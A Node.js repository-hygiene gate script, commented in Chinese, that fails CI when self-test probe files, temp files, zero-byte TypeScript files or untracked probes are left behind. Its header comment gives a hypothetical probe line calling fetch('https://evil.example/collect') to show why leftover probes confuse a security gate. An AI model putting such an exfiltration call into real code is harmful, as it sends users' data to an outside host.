/**
 * 仓库卫生：不允许提交自测的临时探针文件。
 *
 * ── 这条门禁是被一次真实事故催生的 ────────────────────────────────
 *
 * 写 `security-claims-self-test.mjs` 时，它的 `cleanup()` 里有一句：
 *
 *   writeFileSync(PROBE, '', 'utf8');   // 想"至少别留下带 fetch 的文件"
 *   if (existsSync(PROBE)) unlinkSync(PROBE);
 *
 * 空写那一步是罪魁：删失败时留下的是**一个 0 字节的合法文件名**
 * （`src/lib/__net-probe.ts`），比"没删掉"更难察觉。
 *
 * 结果 `git commit -a` 把它提交进了仓库。我是在 commit 输出里
 * 看到 `create mode 100644 src/lib/__net-probe.ts` 才发现。
 *
 * ── 为什么值得单独一条门禁 ────────────────────────────────────────
 *
 * 1. 这类残留**不会让任何测试变红** —— 空文件不影响编译、不影响运行，
 *    所以它能一直躺在仓库里。
 * 2. 它会**慢慢腐蚀信任**：下一个人看到 `src/lib/__net-probe.ts`
 *    会以为那是产品代码的一部分。
 * 3. 更糟的情况是探针里带着 `fetch("https://evil.example/collect")`
 *    —— 那 `security-claims.mjs` 会红，但理由是错的
 *    （它以为产品在往外发数据）。
 *
 * 检查三件事：
 *   A. `src/` 与 `scripts/` 里不存在形如 `__*probe*` / `tmp-*` / `*.orig` 的文件
 *   B. 不存在 0 字节的 `.ts` / `.tsx` 文件（几乎必然是残留）
 *   C. `git status` 里没有未跟踪的探针类文件（防"还没提交但已经留着"）
 *
 * 局限：文件名模式是人定的，不可能穷举。但这三种覆盖了实际发生过的形态，
 * 而且比"靠人记得清理"可靠得多。
 */
import { readFileSync, readdirSync, statSync, existsSync } from 'node:fs';
import { join, basename } from 'node:path';
import { spawnSync } from 'node:child_process';

let checks = 0;
let failures = 0;
function item(name, ok, evidence) {
  checks += 1;
  if (ok) console.log('  ✓ ' + name);
  else {
    failures += 1;
    console.error('  ✗ ' + name + (evidence ? ' — ' + evidence : ''));
  }
}

function walk(dir, out = []) {
  if (!existsSync(dir)) return out;
  for (const name of readdirSync(dir)) {
    const p = join(dir, name);
    const st = statSync(p);
    if (st.isDirectory()) {
      if (name === 'node_modules' || name === 'dist' || name === '.git') continue;
      walk(p, out);
    } else {
      out.push({ path: p, size: st.size });
    }
  }
  return out;
}

/* 只收文本类文件（给"文档引用"检查用） */
function walkText(dir) {
  return walk(dir)
    .map((f) => f.path)
    .filter((p) => /\.(md|mjs|ts|tsx|json)$/.test(p));
}

/** `scripts/dev/` 的判断（两种分隔符都要吃，Windows 下是反斜杠） */
const DEV_DIR_TEST = /^scripts[\\/]dev[\\/]/;

const srcFiles = [...walk('src'), ...walk('scripts')];

console.log('');
console.log('仓库卫生检查（自测临时文件不得残留）');
console.log(`  （扫描 src/ 与 scripts/，共 ${srcFiles.length} 个文件）`);
console.log('');

/* ── A. 探针类命名 ── */
{
  /*
   * 这些命名是自测/调试常用的临时文件形态。
   *
   * ⚠️ 第一版只匹配 `\.[tj]sx?$`（.ts/.tsx/.js/.jsx），
   * **漏掉了 `.mjs`** —— 而本仓库的脚本全是 `.mjs`。
   * 于是 `scripts/dev/` 里整整 27 个 `probe-*.mjs` 一个都没被抓到，
   * 门禁报告"没有探针文件"，绿得很漂亮。
   *
   * 这是又一次「幽灵门禁」：断言形状正确，但**覆盖范围漏了最该管的那一类**。
   * 更讽刺的是它发生在一条专门防"残留文件"的门禁里。
   *
   * 教训：写路径/后缀正则时，**先去仓库里数一数真实的文件后缀分布**，
   * 而不是凭项目"应该是 TS"的印象写。
   */
  const PROBE_PATTERNS = [
    /^__.*probe.*\.[cm]?[tj]sx?$/i, // __net-probe.ts ← 实际泄漏过的那个
    /^probe-.*\.[cm]?[tj]sx?$/i,
    /^tmp-.*\.[cm]?[tj]sx?$/i,
    /\.orig$/,
    /\.rej$/,
    /\.bak$/,
  ];

  /*
   * 例外：`scripts/dev/` 是 CONTRACT §8 明文记录的**开发期核查脚本**目录，
   * 那里的 `probe-*.mjs` 是有意保留的（记录某个 bug 的可复现现场）。
   *
   * 但例外不能是"免检"。见下面 B2：这些文件必须被文档引用，
   * 否则就是无人认领的残留。
   */
  const DEV_DIR = /^scripts[\\/]dev[\\/]/;

  const hits = srcFiles
    .filter((f) => !DEV_DIR.test(f.path))
    .filter((f) => PROBE_PATTERNS.some((re) => re.test(basename(f.path))))
    .map((f) => f.path);

  item('src/ 与 scripts/（除 scripts/dev/）里没有探针/临时文件',
    hits.length === 0, hits.join(', '));
}

/* ── A2. scripts/dev/ 的探针必须被文档引用 ── */
{
  /*
   * `scripts/dev/` 允许放开发期探针，但**每个脚本都必须有人认领** ——
   * 要么被某个 Markdown 文档提到（说明它记录了什么问题），
   * 要么被其他脚本 import（说明它是活跃工具，如 `harness.mjs`）。
   *
   * 为什么要有这条：这些脚本是我历次排查时写的一次性工具。
   * 排查完就该删，除非它记录的结论还有价值。
   * 如果既没人引用也没人 import，那它就是**没人知道为什么存在**的文件 ——
   * 下一个人不敢删，也不知道能不能改。
   *
   * ⚠️ 第一版把 `walk()` 的全部结果都算进来，于是 21 张基线截图
   * （`scripts/dev/shots/*.png`）和 9 个 JSON 也被要求"被文档引用"。
   * 那些是**生成物**，不是源文件 —— 它们由 `verify-visual-criteria.mjs`
   * 产出并被视觉回归引用，不该逐个写进 Markdown。
   *
   * 规则修正：只查**脚本**（.mjs/.ts），生成物一律放过。
   * 这也是「先分清源文件与生成物，再谈卫生」——
   * 否则门禁会逼人去给每一张截图编一个文档引用。
   */
  const devScripts = srcFiles.filter(
    (f) => DEV_DIR_TEST.test(f.path) && /\.[cm]?[tj]sx?$/.test(f.path),
  );
  const mdFiles = walkText('.').filter((p) => /\.md$/.test(p) && !/node_modules/.test(p));
  const mdText = mdFiles.map((p) => readFileSync(p, 'utf8')).join('\n');

  /*
   * 认领的三种方式：
   *   1. 被 Markdown 文档提到 —— CONTRACT §8 那种
   *   2. 被其他 dev 脚本 import —— `harness.mjs` / `_shared/preview.mjs` 这种
   *   3. **被其他脚本的源码提到**（含注释）
   *
   * 第 3 种是被 `probe-ridge-trench.mjs` 逼出来的：
   * `verify-visual-criteria.mjs` L339 的注释里写着
   *   「实测（`probe-ridge-trench.mjs`，读 canvas 亮度）：…」
   * 这不是调用，而是**把一个测量结论的出处留在这里**。
   * 那种探针恰恰最该保留 —— 它是"这个数字怎么来的"的唯一凭证。
   *
   * 所以认领不等于"被依赖"，也包含"被引用为证据"。
   */
  const allScriptText = srcFiles
    .filter((f) => /\.[cm]?[tj]sx?$/.test(f.path) && !DEV_DIR_TEST.test(f.path))
    .map((f) => readFileSync(f.path, 'utf8'))
    .join('\n');

  const claimed = [];
  const orphans = [];
  for (const f of devScripts) {
    const name = basename(f.path);
    const inDoc = mdText.includes(name);
    const inImport = new RegExp(
      `from\\s+['"]\\./${name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}['"]`,
    ).test(allScriptText);
    const inSourceComment = allScriptText.includes(name);
    if (inDoc || inImport || inSourceComment) claimed.push(name);
    else orphans.push(name);
  }

  item(
    `scripts/dev/ 的 ${devScripts.length} 个脚本都有人认领（文档 / import / 源码出处）`,
    orphans.length === 0,
    orphans.length > 0 ? `无主 ${orphans.length} 个：` + orphans.join(', ') : '',
  );
}

/* ── B. 0 字节的源码文件 ── */
{
  /*
   * 0 字节的 .ts/.tsx 几乎必然是残留（正常源文件不可能空）。
   * 这条正是抓出 `__net-probe.ts` 的那个形态 —— 空写留下的空壳。
   */
  const empty = srcFiles
    .filter((f) => /\.(ts|tsx)$/.test(f.path) && f.size === 0)
    .map((f) => f.path);

  item('没有 0 字节的 .ts/.tsx 文件', empty.length === 0,
    empty.length > 0 ? empty.join(', ') : '');
}

/* ── C. git 层面：没有未跟踪的探针文件 ── */
{
  const r = spawnSync('git', ['status', '--porcelain', '--untracked-files=all'], {
    encoding: 'utf8',
  });
  if (r.status === 0) {
    const lines = String(r.stdout ?? '')
      .split('\n')
      .filter((l) => l.startsWith('??'))
      .map((l) => l.slice(3).trim());
    /*
     * tmp/ 是有意的暂存区（gitignored），不算残留。
     * 但 src/ 或 scripts/ 下的未跟踪文件可能是马上要提交的，
     * 也可能是忘删的 —— 只要名字像探针就报。
     */
    const suspicious = lines.filter(
      (p) =>
        (p.startsWith('src/') || p.startsWith('scripts/')) &&
        /__.*probe|^.*probe-|tmp-|\.orig$|\.rej$/.test(basename(p)),
    );
    item('git 未跟踪文件里没有探针类残留', suspicious.length === 0, suspicious.join(', '));
  } else {
    /* 不是 git 仓库时跳过，而不是假装通过 */
    console.log('  – 跳过 git 检查（非 git 仓库或 git 不可用）');
  }
}

/* ── D. 自测脚本的 cleanup 不许「写」探针文件 ── */
{
  /*
   * 治本：把事故的**根因**也变成可检查的。
   *
   * `_net-probe` 泄漏的直接原因是 cleanup() 里对探针文件调用了
   * writeFileSync —— 清理逻辑只该删除，不该写入。
   *
   * ⚠️ 但**变异体本身当然要写探针文件**（不写怎么测门禁？）。
   * 所以只检查 `cleanup` 函数体内部，而不是整个文件。
   * 第一版就是扫了整个文件，结果把这个自测里 6 处合法的变异写入
   * 全报成违规 —— 又是一次"审计器给出反直觉数字（6 处违规），
   * 先怀疑审计器"。
   *
   * 提取方式：从 `function cleanup(` 或 `const cleanup =` 开始，
   * 到下一个顶格 `}` 或 `process.on('exit'` 为止。
   */
  const selfTests = srcFiles.filter((f) => /-self-test\.mjs$/.test(f.path));
  const bad = [];
  let scannedWithCleanup = 0;

  for (const f of selfTests) {
    const text = readFileSync(f.path, 'utf8');
    const lines = text.split('\n');

    /* 找 cleanup 函数定义 */
    const start = lines.findIndex((l) => /^\s*(function cleanup\s*\(|const cleanup\s*=)/.test(l));
    if (start === -1) continue;
    scannedWithCleanup += 1;

    /* 找它结束的位置：从 start 往后，遇到顶格 `}` 或顶层语句 */
    let end = lines.length;
    for (let i = start + 1; i < lines.length; i += 1) {
      if (/^(}|process\.on\(|\S)/.test(lines[i])) {
        end = i;
        break;
      }
    }

    for (let i = start; i < end; i += 1) {
      const line = lines[i];
      if (/^\s*(\*|\/\/)/.test(line)) continue;
      if (/writeFileSync\s*\(\s*PROBE/.test(line)) bad.push(`${f.path}:${i + 1}`);
    }
  }

  item(
    `已检查 ${scannedWithCleanup} 个含 cleanup() 的自测脚本，清理逻辑不写探针文件`,
    bad.length === 0,
    bad.join(', '),
  );
}

console.log('');
console.log(`合计：${checks} 项，${failures} 项失败`);
if (failures > 0) {
  console.error('');
  console.error('  这类残留不会让任何测试变红，所以只能靠这条专门的门禁。');
  console.error('  清理逻辑请「只删不写」—— 空写会留下一个看起来合法的空文件。');
  process.exit(1);
}
console.log('✓ 没有自测临时文件残留');
